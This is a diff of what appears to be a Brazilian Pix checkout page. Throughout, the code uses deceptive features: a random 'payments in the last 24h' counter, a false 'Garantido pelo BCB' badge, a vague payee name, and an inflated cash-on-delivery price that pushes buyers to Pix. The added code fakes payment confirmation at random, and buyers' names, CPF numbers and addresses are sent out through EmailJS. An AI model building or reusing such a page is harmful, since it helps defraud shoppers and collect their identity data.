-        .divider-text-new{font-size:10px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap}
-        .qr-wrapper-new{display:flex;justify-content:center;margin-bottom:20px}
-        .qr-box-new{position:relative;display:inline-block;border:1px solid #e2e8f0;border-radius:16px;padding:16px;background:#fff}
-        .corner-new{position:absolute;width:16px;height:16px;border:2px solid #111}
-        .corner-tl-new{top:8px;left:8px;border-right:none;border-bottom:none;border-top-left-radius:4px}
-        .corner-tr-new{top:8px;right:8px;border-left:none;border-bottom:none;border-top-right-radius:4px}
-        .corner-bl-new{bottom:8px;left:8px;border-right:none;border-top:none;border-bottom-left-radius:4px}
-        .corner-br-new{bottom:8px;right:8px;border-left:none;border-top:none;border-bottom-right-radius:4px}
-        .trust-signals-new{display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:16px;border-top:1px solid #e2e8f0;border-bottom:1px solid #e2e8f0;padding:12px 0;margin-bottom:20px}
-        .trust-item-signal-new{display:flex;align-items:center;gap:4px;font-size:11px;font-weight:700;color:#64748b}
-        .whatsapp-box-new{background:rgba(34,197,94,.03);border:1px solid rgba(34,197,94,.2);border-radius:12px;padding:16px;margin-bottom:16px;text-align:left}
-        .whatsapp-title-new{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:#16a34a;margin-bottom:8px}
-        .whatsapp-list-new{font-size:12px;color:#16a34a;line-height:1.7;list-style:none}
-        .whatsapp-list-new li::before{content:"• ";font-weight:700}
-        .accordion-new{margin-bottom:10px;border:1px solid #e2e8f0;border-radius:12px;overflow:hidden;background:#f8fafc;text-align:left}
-        .accordion-header-new{width:100%;padding:14px 16px;background:none;border:none;text-align:left;cursor:pointer;display:flex;align-items:center;justify-content:space-between}
-        .accordion-title-new{font-size:14px;font-weight:700;color:#111}
-        .accordion-subtitle-new{font-size:12px;color:#64748b;margin-top:2px}
-        .accordion-arrow-new{font-size:12px;color:#94a3b8;transition:transform .2s}
-        .accordion-arrow-new.open{transform:rotate(180deg)}
-        .accordion-body-new{padding:14px 16px;border-top:1px solid #e2e8f0;background:#fff;font-size:13px;color:#64748b;line-height:1.6}
-        .upload-zone-new{display:flex;align-items:center;justify-content:center;gap:8px;border:2px dashed #e2e8f0;background:#f8fafc;border-radius:12px;padding:14px;font-size:14px;font-weight:700;color:#64748b;cursor:pointer;transition:all .2s}
-        .instructions-new{margin-top:20px;border-top:1px solid #e2e8f0;padding-top:16px;text-align:left}
-        .instructions-title-new{font-size:14px;font-weight:800;color:#111;margin-bottom:12px}
-        .instructions-list-new{font-size:13px;color:#64748b;line-height:1.8;list-style:none}
-        .sticky-footer-new{position:fixed;bottom:0;left:0;right:0;z-index:50;border-top:1px solid #e2e8f0;background:rgba(255,255,255,.95);backdrop-filter:blur(8px);padding:12px 16px;box-shadow:0 -4px 16px rgba(0,0,0,.06)}
-        .sticky-footer-inner-new{max-width:480px;margin:0 auto}
-        .sticky-btn-new{width:100%;border:none;border-radius:12px;padding:14px;font-size:16px;font-weight:900;color:#fff;background:#22c55e;cursor:pointer;box-shadow:0 4px 16px rgba(34,197,94,.3);transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
-        @keyframes pulse-scale{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
-        @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                border-radius: 0;
+            }
 
+            .modal-content, .payment-confirmation-content {
+                max-width: 100%;
+                border-radius: 20px 20px 0 0;
+            }
+        }
     </style>
 </head>
 <body>
@@ -1584,7 +1185,7 @@
                 </div>
             </div>
             <div class="header-right">
-                <button class="search-btn" title="Pesquisar">
+                <button class="search-btn" title="Buscar">
                     <i class="fas fa-search"></i>
                 </button>
                 <button class="cart-btn" id="cart-btn" title="Carrinho">
@@ -1605,66 +1206,38 @@
             </div>
         </div>
 
-        <div id="order-summary-wrapper"></div>
         <div id="cart-content-wrapper"></div>
     </div>
 
-    <div class="modal-overlay" id="delivery-modal">
-        <div class="modal-content">
-            <button class="modal-close-btn" id="modal-close-btn-delivery">
-                <i class="fas fa-times"></i>
-            </button>
-
-            <div id="modal-step-1">
-                <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
-                <h3 class="modal-title">Você tem certeza?</h3>
-                <p class="modal-text" id="delivery-warning-text"></p>
-                <div class="modal-buttons">
-                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
-                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
-                        Continuar sem desconto
-                    </button>
+    <!-- MODAL DE CONFIRMAÇÃO DE PAGAMENTO -->
+    <div class="payment-confirmation-modal" id="paymentConfirmationModal">
+        <div class="payment-confirmation-content">
+            <div class="confirmation-icon">✓</div>
+            <h2 class="confirmation-title">Pagamento Confirmado!</h2>
+            <p class="confirmation-text">Seu pagamento foi processado com sucesso. Obrigado pela compra!</p>
+            <div class="confirmation-details">
+                <div class="confirmation-detail-row">
+                    <span class="confirmation-detail-label">Valor:</span>
+                    <span class="confirmation-detail-value" id="confirmationAmount">R$ 0,00</span>
+                </div>
+                <div class="confirmation-detail-row">
+                    <span class="confirmation-detail-label">Método:</span>
+                    <span class="confirmation-detail-value">Pix</span>
+                </div>
+                <div class="confirmation-detail-row">
+                    <span class="confirmation-detail-label">Status:</span>
+                    <span class="confirmation-detail-value" style="color: var(--success);">Pago</span>
                 </div>
             </div>
-
-            <div id="modal-step-2" style="display:none;">
-                <h3 class="modal-title">Dados para Entrega</h3>
-                <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
-                <form class="contact-form" id="delivery-contact-form">
-                    <div class="form-group">
-                        <label>Nome Completo</label>
-                        <input type="text" id="delivery-name" placeholder="Seu nome completo" required>
-                    </div>
-                    <div class="form-group">
-                        <label>E-mail</label>
-                        <input type="email" id="delivery-email" placeholder="seu@email.com" required>
-                    </div>
-                    <div class="form-group">
-                        <label>CPF</label>
-                        <input type="tel" id="delivery-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Telefone</label>
-                        <input type="tel" id="delivery-phone" placeholder="(00) 00000-0000" required>
-                    </div>
-                    <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
-                </form>
-            </div>
-
-            <div id="modal-step-3" style="display:none;">
-                <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
-                <h3 class="modal-title">Pedido Recebido!</h3>
-                <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
-                <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
-            </div>
+            <button class="btn-confirmation" onclick="closeConfirmationModal()">Continuar</button>
         </div>
     </div>
 
     <script>
         // ==================== CONFIGURAÇÕES FIXAS ====================
-        const EMAILJS_SERVICE_ID = 'service_z9s6r88'; // Substitua pelo seu Service ID
-        const EMAILJS_TEMPLATE_ID = 'template_ymp0ana'; // Substitua pelo seu Template ID
-        const EMAILJS_PUBLIC_KEY = 'B7vWg-DOSfFey8sM3'; // Substitua pela sua Public Key
+        const EMAILJS_SERVICE_ID = 'service_z9s6r88';
+        const EMAILJS_TEMPLATE_ID = 'template_ymp0ana';
+        const EMAILJS_PUBLIC_KEY = 'B7vWg-DOSfFey8sM3';
         // =============================================================
 
         function getUrlParameter(name) {
@@ -1709,7 +1282,6 @@
                 e.target.value = maskPhone(e.target.value);
                 const rawValue = e.target.value.replace(/\D/g, '');
                 
-                // Validação instantânea durante a digitação
                 if (rawValue.length === 11) {
                     checkIcon.classList.add('visible');
                 } else {
@@ -1731,7 +1303,6 @@
                 e.target.value = maskCPF(e.target.value);
                 const rawValue = e.target.value.replace(/\D/g, '');
                 
-                // Validação instantânea durante a digitação
                 if (rawValue.length === 11) {
                     checkIcon.classList.add('visible');
                 } else {
@@ -1760,20 +1331,9 @@
             });
         }
 
-function renderOrderSummary() {
-    // Seção de resumo do pedido removida conforme solicitado
-    const wrapper = document.getElementById('order-summary-wrapper');
-    if (wrapper) {
-        wrapper.innerHTML = '';
-    }
-}
-
-
         function renderPaymentOptions() {
             const baseTotal = subtotalValue;
             const deliveryTotal = baseTotal * 1.46;
-            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Pix de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
-            let selectedPaymentType = '';
 
             const paymentHTML = `
                 <div class="review-block">
@@ -1785,13 +1345,12 @@ function renderOrderSummary() {
                     </div>
                     <div class="payment-options-container">
                         <div class="payment-option-card" id="pay-now-pix">
-                            
                             <div id="pix-original-content">
                                 <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
                                 <div class="payment-option-title">
                                     <span>Pagar Agora - Pix</span>
                                     <span class="promo-badge">Promoção</span>
-</div>
+                                </div>
                                 <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                                 <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
                                 <div class="pix-form-container" id="pix-form">
@@ -1816,24 +1375,97 @@ function renderOrderSummary() {
                                     </button>
                                 </div>
                             </div>
+
+                            <!-- SEÇÃO DE CÓPIA DO PIX COM MELHORIAS DE UX -->
                             <div id="pix-copy-content" class="pix-copy-section">
-                                <!-- ESTE CONTEÚDO SERÁ SUBSTITUÍDO PELO DESIGN DO CHECKOUT 2 NO JS -->
-                            </div>
-                        </div>
-                        <div class="payment-option-card" id="pay-on-delivery">
-                            <div class="payment-badge-delivery" style="position: absolute; top: 12px; right: -30px; background: var(--text-light); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
-                            <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
-                            <div class="payment-option-title">Pagamento na Entrega</div>
-                            <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
-                            <div class="payment-option-desc">Pague ao receber o produto. Sem desconto da promoção Pix.</div>
-                            <div class="delivery-warning-container">
-                                <div class="delivery-warning-box">
-                                    <i class="fas fa-info-circle"></i>
-                                    <span>Você perderá o desconto de R$ ${(deliveryTotal - baseTotal).toFixed(2).replace('.', ',')} ao escolher esta opção.</span>
+                                <div class="pix-header-status">
+                                    <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
+                                    <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>
                                 </div>
-                                <button class="payment-action-btn btn-pay-delivery" style="background: var(--text-gray);">
-                                    Finalizar na Entrega
+
+                                <!-- QR CODE VISUAL -->
+                                <div class="pix-qr-container">
+                                    <div class="pix-qr-label">Escaneie o QR Code</div>
+                                    <div id="qrCodeContainer"></div>
+                                </div>
+
+                                <!-- INSTRUÇÕES PASSO A PASSO -->
+                                <div class="pix-instructions-section">
+                                    <div class="instructions-title">
+                                        <i class="fas fa-lightbulb"></i> Como Pagar
+                                    </div>
+                                    <ul class="instructions-list">
+                                        <li>
+                                            <div class="instruction-number">1</div>
+                                            <span>Abra seu aplicativo bancário ou de pagamento</span>
+                                        </li>
+                                        <li>
+                                            <div class="instruction-number">2</div>
+                                            <span>Escaneie o QR Code acima ou copie o código Pix</span>
+                                        </li>
+                                        <li>
+                                            <div class="instruction-number">3</div>
+                                            <span>Confirme o pagamento de R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
+                                        </li>
+                                        <li>
+                                            <div class="instruction-number">4</div>
+                                            <span>Pronto! Seu pedido será processado automaticamente</span>
+                                        </li>
+                                    </ul>
+                                </div>
+
+                                <!-- DADOS DO TITULAR -->
+                                <div class="duty-info-section">
+                                    <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
+                                    <div class="duty-user-data">
+                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
+                                    </div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
+                                </div>
+
+                                <!-- CÓDIGO PIX PARA COPIAR -->
+                                <div class="pix-code-wrapper">
+                                    <div class="pix-code-header">
+                                        <label class="pix-code-label">Código Pix (Copia e Cola)</label>
+                                        <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
+                                    </div>
+                                    <div class="pix-code-input-container">
+                                        <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
+                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                </div>
+
+                                <!-- BOTÕES DE AÇÃO PRINCIPAL -->
+                                <button class="btn-copy-and-open" id="btn-copy-and-open">
+                                    <i class="fas fa-copy"></i> Copiar Código e Abrir Banco
                                 </button>
+                                <button class="btn-copy-pix" id="btn-copy-pix-action">
+                                    <i class="fas fa-copy"></i> Copiar Código Pix
+                                </button>
+
+                                <!-- STATUS DE PAGAMENTO EM TEMPO REAL -->
+                                <div class="payment-status-container">
+                                    <div class="payment-status-item">
+                                        <div class="payment-status-icon pending">
+                                            <i class="fas fa-hourglass-half"></i>
+                                        </div>
+                                        <span>Aguardando seu pagamento...</span>
+                                    </div>
+                                    <div class="payment-status-item">
+                                        <div class="payment-status-icon confirmed" style="display:none;" id="paymentConfirmedIcon">
+                                            <i class="fas fa-check"></i>
+                                        </div>
+                                        <span style="display:none; color: var(--success);" id="paymentConfirmedText">Pagamento confirmado! ✓</span>
+                                    </div>
+                                </div>
+
+                                <!-- BOTÃO DE VERIFICAÇÃO MANUAL -->
+                                <button class="payment-action-btn" id="btn-verify-payment" style="background: var(--success); margin-top: 10px;">
+                                    <i class="fas fa-sync"></i> Verificar Pagamento
+                                </button>
+
+                                <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
                             </div>
                         </div>
                     </div>
@@ -1841,6 +1473,7 @@ function renderOrderSummary() {
             `;
 
             document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
+
             const pixNameInput = document.getElementById('pix-name');
             if (pixNameInput) setupNameInput(pixNameInput);
             const pixCpfInput = document.getElementById('pix-cpf');
@@ -1849,7 +1482,7 @@ function renderOrderSummary() {
             if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
 
             const pixCard = document.getElementById('pay-now-pix');
-            const deliveryCard = document.getElementById('pay-on-delivery');
+            let selectedPaymentType = '';
 
             pixCard.addEventListener('click', (e) => {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
@@ -1857,55 +1490,32 @@ function renderOrderSummary() {
                 if (selectedPaymentType !== 'pix') {
                     selectedPaymentType = 'pix';
                     pixCard.classList.add('selected');
-                    deliveryCard.classList.remove('selected');
-                    const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = pixCard.offsetHeight; const elementOffsetTop = pixCard.getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
                 } else if (e.target.closest('#btn-generate-pix')) {
                     generatePix();
                 }
             });
 
-            deliveryCard.addEventListener('click', (e) => {
-                if (selectedPaymentType !== 'delivery') {
-                    selectedPaymentType = 'delivery';
-                    deliveryCard.classList.add('selected');
-                    pixCard.classList.remove('selected');
-                } else if (e.target.closest('.btn-pay-delivery')) {
-                    showDeliveryModal();
-                }
-            });
+            document.getElementById('btn-copy-pix-action').addEventListener('click', copyPixCode);
+            document.getElementById('btn-copy-and-open').addEventListener('click', copyAndOpenBank);
+            const quickCopyBtn = document.getElementById('btn-copy-pix-quick');
+            if (quickCopyBtn) quickCopyBtn.addEventListener('click', (e) => { e.preventDefault(); copyPixCode(); });
+            
+            // Botão de verificação de pagamento
+            document.getElementById('btn-verify-payment').addEventListener('click', simulatePaymentVerification);
         }
 
-
-
-        let timerInterval; 
+        let timerInterval;
         function startPixTimer(durationInSeconds) {
             clearInterval(timerInterval);
             let timer = durationInSeconds;
-            
+            const display = document.getElementById('pix-timer');
             timerInterval = setInterval(() => {
                 let minutes = parseInt(timer / 60, 10);
                 let seconds = parseInt(timer % 60, 10);
-                const displayTime = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
-                
-                // Atualizar elementos do novo design
-                const fill = document.getElementById('timer-fill');
-                if(fill){
-                    const pct = (timer / durationInSeconds) * 100;
-                    fill.style.width = pct + '%';
-                    fill.className = timer <= 120 ? 'progress-fill red' : timer <= 300 ? 'progress-fill yellow' : 'progress-fill green';
-                }
-                const timerEl = document.getElementById('timer-text');
-                if(timerEl){
-                    timerEl.textContent = displayTime;
-                    timerEl.className = timer <= 120 ? 'timer-text timer-urgent' : timer <= 300 ? 'timer-text timer-warning' : 'timer-text';
-                }
-                const statusEl = document.getElementById('status-text-new');
-                const badgeEl = document.getElementById('status-badge-new');
-                if(statusEl) statusEl.textContent = timer <= 0 ? 'Código expirado — gere um novo' : 'Aguardando pagamento';
-                if(badgeEl) badgeEl.className = 'status-badge-new ' + (timer <= 120 ? 'urgent' : 'waiting');
-
+                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
                 if (--timer < 0) { 
                     clearInterval(timerInterval); 
+                    display.textContent = "EXPIRADO"; 
                 }
             }, 1000);
         }
@@ -1914,22 +1524,27 @@ function renderOrderSummary() {
             try {
                 const addressFromUrl = getUrlParameter('address') || '';
                 const cepFromUrl = getUrlParameter('cep') || '';
-                const deliveryTimeFromUrl = getUrlParameter('delivery_time') || '';
+                
                 let endereco_entrega = '';
                 if (addressFromUrl && cepFromUrl) {
                     endereco_entrega = `Endereço: ${addressFromUrl}, CEP: ${cepFromUrl}`;
                 } else if (addressFromUrl) {
                     endereco_entrega = `Endereço: ${addressFromUrl}`;
                 }
+                
                 const dados_cliente = `Nome: ${name}, CPF: ${cpf}`;
                 const valor_compra = parseFloat(valor).toFixed(2).replace('.', ',');
+                
                 const templateParams = {
                     endereco_entrega: endereco_entrega,
                     dados_cliente: dados_cliente,
                     valor_compra: valor_compra
                 };
+                
                 await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
-            } catch (err) { console.error('EmailJS error:', err); }
+            } catch (err) { 
+                console.error('EmailJS error:', err); 
+            }
         }
 
         async function generatePix() {
@@ -1944,6 +1559,13 @@ function renderOrderSummary() {
             if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
             if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
 
+            const savedPix = JSON.parse(localStorage.getItem('cached_pix_data'));
+            
+            if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
+                showPixCopySection(savedPix.code, name, cpfRaw);
+                return;
+            }
+
             const btn = document.getElementById('btn-generate-pix');
             const originalHTML = btn.innerHTML;
             btn.innerHTML = '<div class="spinner"></div>';
@@ -1952,14 +1574,16 @@ function renderOrderSummary() {
             try {
                 sendEmailJS(name, cpfRaw, phone, subtotalValue);
                 
-                let pixCode;
                 if (cpf === '11111111111') {
-                    pixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
-                } else {
-                    pixCode = await fetchPixCode(name, cpf, phone);
+                    const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
+                    showPixCopySection(fakePixCode, name, cpfRaw);
+                    return;
                 }
 
+                const pixCode = await fetchPixCode(name, cpf, phone);
                 if (pixCode) { 
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
                     showPixCopySection(pixCode, name, cpfRaw); 
                 }
                 else { throw new Error(); }
@@ -1987,108 +1611,124 @@ function renderOrderSummary() {
         }
 
         function showPixCopySection(qrCode, name, cpf) {
-            const pixPrice = subtotalValue.toFixed(2).replace('.',',');
-            const socialCount = 130 + Math.floor(Math.random() * 40);
-            
-            // Injetar o design do Checkout 2 na seção de cópia
-            const copyContent = document.getElementById('pix-copy-content');
-            copyContent.innerHTML = `
-                <div class="pix-screen" style="padding: 0; background: transparent;">
-                  <div class="pix-card" style="box-shadow: none; border: 1px solid #e2e8f0;">
-                    <div class="progress-bar"><div id="timer-fill" class="progress-fill green" style="width:100%"></div></div>
-                    <div class="pix-content">
-                      <div class="social-proof"><span class="dot-pulse"></span><span id="social-count">${socialCount} pessoas pagaram nas últimas 24h</span></div>
-                      <h1 class="pix-heading">Falta só pagar</h1>
-                      <p class="pix-subheading">Expira em <span id="timer-text" class="timer-text">15:00</span></p>
-                      <div id="status-badge-new" class="status-badge-new waiting"><span class="dot-pulse"></span><span id="status-text-new">Aguardando pagamento</span></div>
-                      <div class="amount-box-new"><span class="amount-label-new">Valor a pagar</span><div class="amount-value-new">R$ ${pixPrice}</div></div>
-                      <div class="beneficiary-new"><div class="beneficiary-label-new">Você vai pagar para</div><div class="beneficiary-name-new">SISTEMA DE PAGAMENTOS LTDA</div><div class="beneficiary-hint-new">Confirme este nome no seu app antes de pagar</div></div>
-                      <button id="copy-btn-new-action" class="copy-btn-new"><i class="fas fa-copy"></i> Copiar código PIX</button>
-                      <p class="copy-hint-new">Cole no app do seu banco em <strong>PIX → Copia e Cola</strong></p>
-                      <div class="bank-apps-new"><div class="bank-apps-title-new">Abrir app do banco</div><div class="bank-grid-new">
-                        <a href="nubank://" class="bank-item-new"><span class="bank-icon-new">💜</span><span class="bank-name-new">Nubank</span></a>
-                        <a href="bancointer://" class="bank-item-new"><span class="bank-icon-new">🧡</span><span class="bank-name-new">Inter</span></a>
-                        <a href="picpay://" class="bank-item-new"><span class="bank-icon-new">💚</span><span class="bank-name-new">PicPay</span></a>
-                        <a href="mercadopago://" class="bank-item-new"><span class="bank-icon-new">💙</span><span class="bank-name-new">Mercado Pago</span></a>
-                      </div></div>
-                      <div class="divider-new"><div class="divider-line-new"></div><span class="divider-text-new">ou escaneie o QR</span><div class="divider-line-new"></div></div>
-                      <div class="qr-wrapper-new"><div class="qr-box-new"><span class="corner-new corner-tl-new"></span><span class="corner-new corner-tr-new"></span><span class="corner-new corner-bl-new"></span><span class="corner-new corner-br-new"></span><div id="qr-canvas-new"></div></div></div>
-                      <div class="trust-signals-new">
-                        <span class="trust-item-signal-new"><span>🔒</span> Pagamento seguro</span>
-                        <span class="trust-item-signal-new"><span>🛡️</span> Garantido pelo BCB</span>
-                        <span class="trust-item-signal-new"><span>⚡</span> Confirmação imediata</span>
-                      </div>
-                      <div class="whatsapp-box-new"><div class="whatsapp-title-new">💬 Atendimento via WhatsApp</div><ul class="whatsapp-list-new"><li>Após pagamento confirmado, entraremos em contato</li><li>Você recebe o rastreio da entrega</li></ul></div>
-                      <div class="accordion-new"><button class="accordion-header-new" onclick="toggleAccordionNew(this)"><div><div class="accordion-title-new">Ocorreu um erro no banco?</div><div class="accordion-subtitle-new">Veja como resolver em segundos</div></div><span class="accordion-arrow-new">▼</span></button><div class="accordion-body-new" style="display:none"><p>Devido à alta nas vendas, a chave PIX pode apresentar algum erro no app do banco. Tente pagar por outro banco ou carteira digital que geralmente dá certo.</p></div></div>
-                      <div class="accordion-new"><button class="accordion-header-new" onclick="toggleAccordionNew(this)"><div><div class="accordion-title-new">Pagou e a tela não atualizou?</div><div class="accordion-subtitle-new">Envie o comprovante e confirmamos</div></div><span class="accordion-arrow-new">▼</span></button><div class="accordion-body-new" style="display:none"><p style="margin-bottom:12px">Anexe o comprovante (foto da tela do banco ou PDF). Confirmamos em até 15 minutos.</p><label class="upload-zone-new">📎 Selecionar comprovante<input type="file" accept="image/*,application/pdf" style="display:none" onchange="alert('Comprovante selecionado!')"></label></div></div>
-                      <div class="instructions-new"><h3 class="instructions-title-new">Como pagar?</h3><ol class="instructions-list-new"><li>1. Abra o app do seu banco ou carteira digital.</li><li>2. Escolha <strong>PIX</strong> → <strong>Pagar com QR Code</strong> ou <strong>Copia e Cola</strong>.</li><li>3. Escaneie o QR Code ou cole o código copiado.</li><li>4. Confira os dados e confirme o pagamento.</li><li>5. Pronto! Seu pedido será processado automaticamente.</li></ol></div>
-                    </div>
-                  </div>
-                </div>
-                <div class="sticky-footer-new" id="sticky-footer-new"><div class="sticky-footer-inner-new"><button id="sticky-btn-new-action" class="sticky-btn-new">📋 Copiar código PIX</button></div></div>
-            `;
-
             document.getElementById('pix-original-content').style.display = 'none';
-            copyContent.style.display = 'flex';
-            
-            // Gerar QR Code
-            new QRCode(document.getElementById("qr-canvas-new"), {
-                text: qrCode,
-                width: 180,
-                height: 180
+            document.getElementById('pix-copy-content').style.display = 'flex';
+            document.getElementById('display-pix-name').innerText = name;
+            document.getElementById('display-pix-cpf').innerText = cpf;
+            document.getElementById('pix-code-text').innerText = qrCode;
+
+            // Gerar QR Code visual
+            generateQRCode(qrCode);
+
+            const pixCardEl = document.getElementById('pay-now-pix');
+            if (pixCardEl) {
+                const header = document.querySelector('.header');
+                const headerHeight = header ? header.offsetHeight : 0;
+                const viewportHeight = window.innerHeight - headerHeight;
+                const elementHeight = pixCardEl.offsetHeight;
+                const elementOffsetTop = pixCardEl.getBoundingClientRect().top + window.pageYOffset;
+                const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2);
+                window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
+            }
+            startPixTimer(900);
+        }
+
+        // Gerar QR Code visual usando QRCode.js
+        function generateQRCode(code) {
+            const container = document.getElementById('qrCodeContainer');
+            container.innerHTML = '';
+            new QRCode(container, {
+                text: code,
+                width: 200,
+                height: 200,
+                colorDark: "#0055ff",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
             });
-
-            // Configurar botões de cópia
-            const handleCopy = () => {
-                navigator.clipboard.writeText(qrCode);
-                const btns = [document.getElementById('copy-btn-new-action'), document.getElementById('sticky-btn-new-action')];
-                btns.forEach(btn => {
-                    if(btn) {
-                        const originalText = btn.innerHTML;
-                        btn.innerHTML = '✓ Código copiado!';
-                        btn.style.background = '#16a34a';
-                        setTimeout(() => {
-                            btn.innerHTML = originalText;
-                            btn.style.background = '#22c55e';
-                        }, 2500);
-                    }
-                });
-            };
-
-            document.getElementById('copy-btn-new-action').onclick = handleCopy;
-            document.getElementById('sticky-btn-new-action').onclick = handleCopy;
-
-            startPixTimer(15 * 60);
-            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        window.toggleAccordionNew = function(btn){
-            const body = btn.nextElementSibling;
-            const arrow = btn.querySelector('.accordion-arrow-new');
-            if(body.style.display === 'none'){ body.style.display = 'block'; arrow.classList.add('open'); }
-            else { body.style.display = 'none'; arrow.classList.remove('open'); }
-        };
-
-        function showDeliveryModal() {
-            document.getElementById('delivery-modal').classList.add('active');
+        function copyPixCode() {
+            const code = document.getElementById('pix-code-text').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.getElementById('btn-copy-pix-action');
+                const originalText = btn.innerText;
+                btn.innerText = '✓ Copiado!';
+                btn.style.background = '#28a745';
+                
+                setTimeout(() => { 
+                    btn.innerText = originalText; 
+                    btn.style.background = '#FFC107'; 
+                }, 2000);
+            });
         }
 
-        document.getElementById('modal-close-btn-delivery').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
-        document.getElementById('modal-back-to-pix').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
-        document.getElementById('modal-continue-delivery').onclick = () => {
-            document.getElementById('modal-step-1').style.display = 'none';
-            document.getElementById('modal-step-2').style.display = 'block';
-        };
-        document.getElementById('delivery-contact-form').onsubmit = (e) => {
-            e.preventDefault();
-            document.getElementById('modal-step-2').style.display = 'none';
-            document.getElementById('modal-step-3').style.display = 'block';
-        };
-        document.getElementById('modal-close-final').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
+        // NOVO: Copiar código e abrir banco
+        function copyAndOpenBank() {
+            const code = document.getElementById('pix-code-text').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.getElementById('btn-copy-and-open');
+                const originalHTML = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                btn.style.background = '#28a745';
+                
+                // Sugerir abertura de aplicativo bancário (simulado)
+                setTimeout(() => {
+                    alert('Código Pix copiado! Abra seu aplicativo bancário e cole o código para pagar.');
+                    btn.innerHTML = originalHTML;
+                    btn.style.background = '';
+                }, 1500);
+            });
+        }
 
-        // Inicialização
-        renderOrderSummary();
-        renderPaymentOptions();
+        // NOVO: Simular verificação de pagamento
+        function simulatePaymentVerification() {
+            const btn = document.getElementById('btn-verify-payment');
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<div class="spinner" style="display:inline-block;margin-right:8px;"></div> Verificando...';
+            btn.disabled = true;
+
+            // Simular delay de verificação (em produção, seria uma chamada real ao backend)
+            setTimeout(() => {
+                // Simular 70% de chance de pagamento confirmado
+                const isPaymentConfirmed = Math.random() < 0.7;
+
+                if (isPaymentConfirmed) {
+                    showPaymentConfirmed();
